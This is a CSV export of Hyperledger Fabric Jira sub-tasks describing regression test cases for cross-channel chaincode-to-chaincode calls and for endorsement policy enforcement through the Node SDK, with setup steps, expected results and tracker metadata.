chaincode-to-chaicode testing passing when cc_05 and cc_02 are on different channels,FAB-4719,18001,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:19 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,13/Sep/17 11:03 PM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: e2e_test_example05.sh

Component: endorser

Description:  Verify invoke and query transactions for chaincode-to-chaincode call on different channels by passing channel name as ""channel_name where cc_02 is installed"" for the third argument

Artifact Locations: fabric/test/regression/daily/chaincodetests

Network Topology: e2e_cli

 Client Driver: python script

                      dependency: sudo pip install -U pytest

Input: ./runChaincode.sh (from fabric/test/regression/daily/chaincodetests/envsetup)

Output: [testYourChaincode.py::ChaincodeAPI::test_FAB3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel|http://testyourchaincode.pychaincodeapitest_fab3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel/] PASSED",,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2rz:",,,,,,,,,,,,,,,,,,,,,,,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 5:57 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test chaincode calling chaincode -ve test case passing an incorrect or non-existing channnel name in query fabric/examples/chaincode_example05,FAB-4720,18002,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:20 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Sep/17 12:43 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,,,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2s7:",,,,,,,,,,,,,,,,,,,,,,,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,true,"17/Aug/17 5:58 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"chaincode_to_chaincode -ve Test:  When given incorrect channel name, when cc_02 and cc_05 are on different channels",FAB-4721,18003,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:20 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Sep/17 12:43 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: e2e_test_example05.sh

Component: endorser

Description: Verify if query on chaincode fails when incorrect chaincode install name is passed.

Artifact Locations: fabric/test/regression/daily/chaincodetests

Network Topology: e2e_cli

Client Driver: python script

                     dependency: sudo pip install -U pytest

Input: ./runChaincode.sh (from fabric/test/regression/daily/chaincodetests/envsetup)

Output: [testYourChaincode.py::ChaincodeAPI::test_FAB3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel|http://testyourchaincode.pychaincodeapitest_fab3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel/]

FAILED",,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2sf:",,,,,,,,,,,,,,,,,,,,,,,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"21/Jul/17 1:41 AM;Nishi;Duplicate of FAB-4720.

Whether one gives incorrect channel name or non-existing channel name fabric responds with a message something like 
""Error: Error endorsing query: rpc error: code = Unknown desc = Error executing chaincode: Transaction returned with failure: Failed to get policy manager for channel [test] - <nil>""


;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"chaincode_to_chaincode -ve Test:  When channel name of ch_02 is not passed to query i.e. passing """"(empty string), when cc_02 and cc_05 are installed on different channels  ",FAB-4722,18004,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:21 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Sep/17 12:43 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"component: endorser

Description: Verify if query transaction fails when chaincode-to-chaincode call is on different channels and the channel name is passed as """" empty string when cc_05 and cc_o2 are on different channels.

Artifact Locations: fabric/test/regression/daily/chaincodetests

Network Topology: e2e_cli

Client Driver:

    behave

Input: behave chaincodes.feature (from fabric-test/feature)

 ",,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2sn:",,,,,,,,,,,,,,,,,,,,,,,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"17/Aug/17 5:59 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode_to_chaincode: Updated chaincode_example05.go to work with either having a channelname being passed in third argument or simply to have two arguments,FAB-4723,18005,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:21 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,16/Aug/17 3:43 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: e2e_test_example05.sh

Component: endorser

Description: Check if transaction is successful chaincode-to-chaincode call is on the same channel and the channel name is not passed as an argument

Artifact Locations: fabric/test/regression/daily/chaincodetests

Network Topology: e2e_cli

Client Driver: python script

                     dependency: sudo pip install -U pytest

Input: ./runChaincode.sh (from fabric/test/regression/daily/chaincodetests/envsetup)

Output: [testYourChaincode.py::ChaincodeAPI::test_FAB3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel|http://testyourchaincode.pychaincodeapitest_fab3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel/]

PASSED",,ArchanaBalaji,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2sv:",,,,,,,,,,,,,,,,,,,,,,,ArchanaBalaji,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode_to_chaincode: Updated chaincode_example05.go to work with either having a channelname being passed in third argument or simply to have two arguments i.e when ex05 and ex02 are installed on different channels. ,FAB-4724,18006,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:21 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,16/Aug/17 3:43 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: e2e_test_example05.sh

Component: endorser

Description: Check if transaction fails when chaincode-to-chaincode call is on different channels and the channel name is not passed as an argument

Artifact Locations: fabric/test/regression/daily/chaincodetests

Network Topology: e2e_cli

Client Driver: python script

                     dependency: sudo pip install -U pytest

Input: ./runChaincode.sh (from fabric/test/regression/daily/chaincodetests/envsetup)

Output: [testYourChaincode.py::ChaincodeAPI::test_FAB3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel|http://testyourchaincode.pychaincodeapitest_fab3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel/]

FAILED",,ArchanaBalaji,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2t3:",,,,,,,,,,,,,,,,,,,,,,,ArchanaBalaji,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
" using NC_1, with endorsement policy  '1 Admin of Org2'. Send Invoke transaction endorsed by peer1Org1. Invoke fails as expected. ",FAB-4725,18007,13232,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:22 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,," 

Test Name: node e2e tests (fabric-sdk-node/test/integration/e2e) like node create-channel.js, node join-channel.js etc

Component: endorser

Description: Check that when sending transaction to a peer from node client that does not satisfy endorsement policy, the transaction must be rejected.
 Artifact Locations: git clone [https://github.com/suryalnvs/fabric-docker-compose-svt]

                             git clone [https://github.com/hyperledger/fabric-sdk-node]  

                             git clone [https://github.com/hyperledger/fabric] 
                              git clone [https://github.com/hyperledger/fabric-ca]                          
 Network Topology: standard
 Client Driver: Node SDK

 

Please refer to attached test document how to bring up a network(setup_network_to_run_node_e2etests.txt) and be able to run node e2e tests on the network

 

NC_1:
{code:java}
Peer0Org1:Member

Peer1Org1:Member

Peer0Org2:Admin

Peer1Org2:Member{code}
 

Note: You have to tweak endorsement policy and the peer to which you send invoke transaction to inside fabric-sdk-node/test/integration/e2e/e2eutil.js to match Test Input:
{code:java}
Endorsement Policy: 1 Admin of Org2

Invoke Sent to: peer1Org1{code}
 

for endorsement policy update:
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L425-L437]

for sending invoke to right peer update:
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L526-L538]

 ",,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Jun/17 2:15 AM;Nishi;e2e_config.json;https://jira.hyperledger.org/secure/attachment/11189/e2e_config.json","19/Jun/17 11:25 PM;Nishi;setup_network_to_run_node_e2etests.txt;https://jira.hyperledger.org/secure/attachment/11200/setup_network_to_run_node_e2etests.txt",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2tb:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"using NC_1, with endorsement policy '1 Admin of Org2', Send Invoke transaction endorsed by peer0Org2 ",FAB-4726,18008,13232,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:22 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: node e2e tests (fabric-sdk-node/test/integration/e2e) like node create-channel.js, node join-channel.js etc
 Component: endorser
 Description: Check that when sending transaction to a peer from node client that does  satisfy endorsement policy, the transaction must sent successfully to ledger.

Artifact Locations: git clone [https://github.com/suryalnvs/fabric-docker-compose-svt]

                             git clone [https://github.com/hyperledger/fabric-sdk-node]  

                             git clone [https://github.com/hyperledger/fabric] 
                              git clone [https://github.com/hyperledger/fabric-ca]                          
 Network Topology: standard
 Client Driver: Node SDK

 

Please refer to attached test document how to bring up a network(setup_network_to_run_node_e2etests.txt)  in https://jira.hyperledger.org/browse/FAB-4725 
 and be able to run node e2e tests on the network.

 

NC_1:
{code:java}
Peer0Org1:Member

Peer1Org1:Member

Peer0Org2:Admin

Peer1Org2:Member{code}
 

Note: You have to tweak endorsement policy and the peer to which you send invoke transaction to inside fabric-sdk-node/test/integration/e2e/e2eutil.js to match Test Input:
{code:java}
Endorsement Policy: 1 Admin of Org2

Invoke Sent to: peer0Org2{code}
 

for endorsement policy update:
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L425-L437]

for sending invoke to right peer update:
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L526-L538]

 ",,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2tj:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"using NC_1, with endorsement policy  '1 Admin of Org2'. Send Invoke transaction endorsed by peer1Org2. Invoke fails as expected",FAB-4727,18009,13232,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:22 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: node e2e tests (fabric-sdk-node/test/integration/e2e) like node create-channel.js, node join-channel.js etc
 Component: endorser
 Description: Check that when sending transaction to a peer from node client that does not satisfy endorsement policy, the transaction must be rejected.

Artifact Locations: git clone [https://github.com/suryalnvs/fabric-docker-compose-svt]

                             git clone [https://github.com/hyperledger/fabric-sdk-node]  

                             git clone [https://github.com/hyperledger/fabric] 
                              git clone [https://github.com/hyperledger/fabric-ca]                          
 Network Topology: standard
 Client Driver: Node SDK

 

Please refer to attached test document how to bring up a network(setup_network_to_run_node_e2etests.txt)  in https://jira.hyperledger.org/browse/FAB-4725 
 and be able to run node e2e tests on the network.

 

NC_1:
{code:java}
Peer0Org1:Member

Peer1Org1:Member

Peer0Org2:Admin

Peer1Org2:Member{code}
 

Note: You have to tweak endorsement policy and the peer to which you send invoke transaction to inside fabric-sdk-node/test/integration/e2e/e2eutil.js to match Test Input:
{code:java}
Endorsement Policy: 1 Admin of Org2

Invoke Sent to: peer1Org2{code}
 

for endorsement policy update:
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L425-L437]

for sending invoke to right peer update:
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L526-L538]

 ",,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2tr:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Using  NC_1,  with endorsement policy  ""1 Admin of Org2 & 1 member of Org1"", Send Invoke transaction endorsed by peer0Org2. Invoke fails as expected.",FAB-4728,18010,13232,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:23 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: node e2e tests (fabric-sdk-node/test/integration/e2e) like node create-channel.js, node join-channel.js etc
 Component: endorser
 Description: Check that when sending transaction to a peer from node client that does not satisfy endorsement policy, the transaction must be rejected.

Artifact Locations: git clone [https://github.com/suryalnvs/fabric-docker-compose-svt]

                             git clone [https://github.com/hyperledger/fabric-sdk-node]  

                             git clone [https://github.com/hyperledger/fabric] 
                              git clone [https://github.com/hyperledger/fabric-ca]                          
 Network Topology: stanadard
 Client Driver: Node SDK

 

Please refer to attached test document how to bring up a network(setup_network_to_run_node_e2etests.txt)  in https://jira.hyperledger.org/browse/FAB-4725 
 and be able to run node e2e tests on the network.

 

NC_1:
{code:java}
Peer0Org1:Member

Peer1Org1:Member

Peer0Org2:Admin

Peer1Org2:Member{code}
 

Note: You have to tweak endorsement policy and the peer to which you send invoke transaction to inside fabric-sdk-node/test/integration/e2e/e2eutil.js to match Test Input:
{code:java}
 {code}
Endorsement Policy: 1 Admin of Org2 & 1 member of Org1

Invoke Sent to: peer0Org2

\{code for endorsement policy update: [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L425-L437] for sending invoke to right peer update: [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L526-L538] }

 ",,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2tz:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"using NC_1, with endorsement policy  ""1 Admin of Org2 & 1 member of Org1"". Send Invoke transaction endorsed by peer0Org2+peer1Org2. Invoke fails as expected.",FAB-4729,18011,13232,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:23 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: node e2e tests (fabric-sdk-node/test/integration/e2e) like node create-channel.js, node join-channel.js etc
 Component: endorser
 Description: Check that when sending transaction to a peer from node client that does not satisfy endorsement policy, the transaction must be rejected.

Artifact Locations: git clone [https://github.com/suryalnvs/fabric-docker-compose-svt]

                             git clone [https://github.com/hyperledger/fabric-sdk-node]  

                             git clone [https://github.com/hyperledger/fabric] 
                              git clone [https://github.com/hyperledger/fabric-ca]                          
 Network Topology: standard
 Client Driver: Node SDK

Please refer to attached test document how to bring up a network(setup_network_to_run_node_e2etests.txt)  in https://jira.hyperledger.org/browse/FAB-4725 
 and be able to run node e2e tests on the network.

 

NC_1:
{code:java}
Peer0Org1:Member

Peer1Org1:Member

Peer0Org2:Admin

Peer1Org2:Member{code}
 

Note: You have to tweak endorsement policy and the peer to which you send invoke transaction to inside fabric-sdk-node/test/integration/e2e/e2eutil.js to match Test Input:
{code:java}
Endorsement Policy: 1 Admin of Org2 & 1 member of Org1

Invoke Sent to: peer0Org2+peer1Org2{code}
 

for endorsement policy update:
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L425-L437]

for sending invoke to right peer update:
 [https://github.com/hyperledger/fabric-sdk-node/blob/master/test/integration/e2e/e2eUtils.js#L526-L538]

 ",,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2u7:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"  using NC_1 with endorsement policy  ""1 Admin of Org2 & 1 member of Org2"". Send Invoke transaction endorsed by peer0Org2+peer1Org2",FAB-4730,18012,13232,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:23 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: node e2e tests (fabric-sdk-node/test/integration/e2e) like node create-channel.js, node join-channel.js etc
 Component: endorser
 Description: Check that when sending transaction to a peer from node client that does satisfy endorsement policy, the transaction must be sent successfully.

Artifact Locations: git clone [https://github.com/suryalnvs/fabric-docker-compose-svt]
